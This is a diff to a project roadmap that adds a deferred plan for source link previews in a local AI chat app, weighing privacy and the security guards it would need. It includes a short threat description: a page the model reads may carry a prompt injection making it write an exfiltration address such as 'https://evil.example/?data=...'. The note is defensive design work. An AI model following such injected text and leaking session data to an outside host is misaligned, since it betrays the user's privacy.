@@ -33,6 +33,32 @@ write scopes and the permission model.
 
 Start with: the read-only version with `gh`.
 
+### Link previews with an image for the sources of a web answer
+
+Noted 2026-10-31. ChatGPT shows the image of a source (the `og:image` of the page) in its cards. We have the follow-up cards and the
+source pills (PR 335), without images.
+
+Why later: it is decoration, and it works against the promise of a private, local app. Every image tells the site, without a click,
+that this IP address is reading its page, and pages can carry tracking pixels. Nothing in the chain gives an image today: a search
+hit holds a title, an address, a description and a source, and `web_fetch` extracts no image.
+
+What it would need, and why each point matters:
+- **Opt in, off by default.** A setting such as "Show link previews". Without it the app calls no third-party site.
+- **An address the search returned, never one the model wrote.** The model writes the pills, and a page it read can carry an
+  injection that makes it write `https://evil.example/?data=...`. The backend must keep the addresses of the real search results of
+  the session and refuse any other, or the preview endpoint becomes a way to send data out.
+- **A preview endpoint in the Go backend** (`og:image`, title and site name of an address) with an SSRF guard: HTTPS only, no
+  loopback, private or link-local address, checked after the DNS resolution and again on every redirect, a short timeout, a size cap,
+  an image content type only, a cache in memory.
+- **The image itself.** The content security policy only allows `'self'`, `data:`, `file:`, `blob:` and the DuckDuckGo favicons, on
+  purpose: it blocks exfiltration. Two ways, to decide then: the backend fetches the image and hands it over without storing it (the
+  policy does not change, the site sees the same IP address), or the renderer loads it directly with a gate in the main process
+  (`session.webRequest.onBeforeRequest`) that lets through only the image addresses the preview endpoint returned. Loading
+  directly was the first wish, to keep their images out of the app; the gate is what keeps a model-written image address out.
+- **No referrer, no cookies**, and load on hover or on a click rather than on display, if the privacy cost is a concern.
+
+Size: about two PRs (the endpoint with its guards and tests, then the card and the gate).
+
 ### Rich answers: what is left
 
 See [0005](decisions/0005-chat-ui-catalog.md), [0007](decisions/0007-chat-charts-and-plots.md), [0008](decisions/0008-chat-interactions.md)
@@ -52,5 +78,6 @@ and [0009](decisions/0009-lighter-rich-answers-prompt.md).
 
 ## Done
 
+- 2026-10-31: follow-up cards (a `Choice` with a description and an icon) and `SourcePills` in rich answers (PR 335).
 - 2026-10-29: the prompt reads the last answers of the session to keep a family a follow-up needs; `FileRef` opens a text file in the
   Files panel.
